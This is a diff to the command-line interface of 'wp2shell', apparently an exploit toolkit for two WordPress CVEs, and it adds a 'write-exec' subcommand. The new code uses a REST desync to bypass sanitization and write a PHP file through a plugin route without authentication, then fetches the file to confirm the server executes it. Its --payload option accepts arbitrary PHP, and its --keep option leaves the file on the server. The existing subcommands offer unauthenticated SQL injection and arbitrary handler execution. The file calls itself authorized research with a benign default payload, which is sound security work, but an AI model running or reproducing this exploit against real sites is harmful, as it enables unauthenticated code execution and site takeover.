@@ -1,10 +1,11 @@
 """wp2shell — unified CLI for CVE-2026-63030 + CVE-2026-60137 research.
 
 Subcommands:
-  check   non-destructive detector (VULNERABLE / PATCHED / INCONCLUSIVE)
-  sqli    unauthenticated blind/UNION SQLi via the nested batch
-  probe   confirm the desync via the handler-substitution signal
-  seat    run an arbitrary target handler via the desync
+  check       non-destructive detector (VULNERABLE / PATCHED / INCONCLUSIVE)
+  sqli        unauthenticated blind/UNION SQLi via the nested batch
+  write-exec  drop a benign PHP file via the desync and prove the server runs it
+  probe       confirm the desync via the handler-substitution signal
+  seat        run an arbitrary target handler via the desync
 
 AUTHORIZATION: run only against systems you own or are explicitly authorized to
 test, on an isolated network. See AUTHORIZATION.md.
@@ -12,10 +13,11 @@ test, on an isolated network. See AUTHORIZATION.md.
 
 import argparse
 import json
+import secrets
 import sys
 
 from . import desync, sqli
-from .http import endpoints
+from .http import endpoints, http_get
 
 
 def _resolve(base):
@@ -104,6 +106,80 @@ def cmd_sqli(args):
     return 0
 
 
+# ── write-exec ────────────────────────────────────────────────────────────────
+# Non-destructive code-execution PoC. Uses the desync's sanitization bypass (P3) to
+# write a benign PHP file (default: prints 6*7) to a permissive plugin write route,
+# then fetches it to prove the server *executes* it. Needs a vulnerable write route —
+# the bundled lab/acme-templates.php models the common real-world anti-pattern.
+_WE_MARKER = "42-wp2shell-exec-poc"
+_WE_PAYLOAD = '<?php echo (6 * 7) . "-wp2shell-exec-poc"; ?>'  # benign: no input, no syscalls
+
+
+def _base_of(url):
+    for sep in ("/wp-json/", "/?rest_route="):
+        if sep in url:
+            return url.split(sep, 1)[0]
+    return url.rstrip("/")
+
+
+def cmd_write_exec(args):
+    url = _resolve(args.target)
+    base = _base_of(url)
+    print("[*] Unauthenticated write+execute PoC via the CVE-2026-63030 desync (sanitization bypass)")
+    if not desync.desync_present(url):
+        print("[!] no desync signal — target appears PATCHED (63030 closed). Aborting.")
+        return 2
+
+    name = args.name or f"wp2shell_{secrets.token_hex(4)}.php"
+    payload = args.payload
+    custom = payload != _WE_PAYLOAD
+    donor = {"method": "POST", "path": "/wp/v2/categories",
+             "body": {args.name_field: name, args.content_field: payload}}
+    target = {"method": args.method, "path": args.route}
+    resp = desync.seat(url, target, donor, k=1)[2]
+    body = resp.get("body") if isinstance(resp, dict) else None
+    if not isinstance(body, dict) or "stored_file" not in body:
+        code = desync.body_code(resp)
+        if code == "rest_no_route":
+            print(f"[!] route {args.route} is not registered — this is a LAB demo that needs a")
+            print("    vulnerable write route. Install lab/acme-templates.php into the test site's")
+            print("    wp-content/mu-plugins/ (or point --route at a real vulnerable plugin route).")
+        else:
+            print(f"[!] write did not succeed (code={code}):")
+            print(json.dumps(resp, indent=2)[:800])
+        return 2
+
+    stored = str(body["stored_file"])
+    planted = base + "/" + stored.lstrip("/")
+    print(f"[+] wrote {body.get('bytes')} bytes of raw PHP to {stored}")
+    print(f"    (a DIRECT call would have had its <?php stripped by wp_kses_post; the desync bypassed it)")
+
+    fcode, ftext = http_get(planted)
+    print(f"[*] GET {planted} -> HTTP {fcode}")
+    rc = 2
+    if "<?php" in ftext:
+        print("[-] server returned PHP SOURCE — execution under uploads/ is denied (good hardening).")
+        rc = 1
+    elif custom:
+        print(f"[+] handler executed; response body:\n    {ftext.strip()[:300]}")
+        rc = 0
+    elif _WE_MARKER in ftext:
+        print(f"[+] server EXECUTED the PHP -> {ftext.strip()[:120]}")
+        print("    => unauthenticated code execution confirmed (write + execute, no auth).")
+        rc = 0
+    else:
+        print(f"[?] inconclusive; response body:\n    {ftext.strip()[:300]}")
+
+    if args.keep:
+        print(f"[*] --keep set; left the file in place: {stored}")
+    else:
+        neutral = {"method": "POST", "path": "/wp/v2/categories",
+                   "body": {args.name_field: name, args.content_field: "<?php /* wp2shell poc removed */"}}
+        desync.seat(url, target, neutral, k=1)
+        print(f"[*] cleaned up: overwrote the planted file with an inert stub ({stored}).")
+    return rc
+
+
 def build_parser():
     ap = argparse.ArgumentParser(
         prog="wp2shell",
@@ -112,11 +188,12 @@ def build_parser():
         epilog=(
             "command groups:\n"
             "  assessment (use these against an authorized target):\n"
-            "    check   is the target vulnerable? (non-destructive)\n"
-            "    sqli    unauthenticated DB read via the clean-core chain\n"
+            "    check       is the target vulnerable? (non-destructive)\n"
+            "    sqli        unauthenticated DB read via the clean-core chain\n"
+            "    write-exec  prove unauth code execution (needs a vulnerable plugin write route)\n"
             "  research (raw desync primitives):\n"
-            "    probe   confirm the desync signal\n"
-            "    seat    drive the desync primitive directly\n"))
+            "    probe       confirm the desync signal\n"
+            "    seat        drive the desync primitive directly\n"))
     sub = ap.add_subparsers(dest="cmd", required=True)
 
     c = sub.add_parser("check", help="[assessment] non-destructive detector")
@@ -146,6 +223,21 @@ def build_parser():
     sq.add_argument("--prefix", default="wp_", help="DB table prefix fallback (default wp_)")
     sq.add_argument("--maxlen", type=int, default=48, help="max chars per value (blind mode)")
     sq.set_defaults(func=cmd_sqli)
+
+    we = sub.add_parser("write-exec",
+                        help="[assessment/lab] drop a benign PHP file via the desync and prove the "
+                             "server executes it (needs a vulnerable plugin write route)")
+    we.add_argument("target")
+    we.add_argument("--route", default="/acme/v1/save-file",
+                    help="vulnerable write route (default: bundled lab/acme-templates.php)")
+    we.add_argument("--method", default="POST")
+    we.add_argument("--name-field", default="name", help="route param for the filename")
+    we.add_argument("--content-field", default="content", help="route param for the file body")
+    we.add_argument("--name", help="filename to write (default: random wp2shell_<hex>.php)")
+    we.add_argument("--payload", default=_WE_PAYLOAD,
+                    help="PHP to write (default: benign, prints 6*7); keep it non-destructive")
+    we.add_argument("--keep", action="store_true", help="do not neutralize the planted file afterwards")
+    we.set_defaults(func=cmd_write_exec)
 
     return ap
 
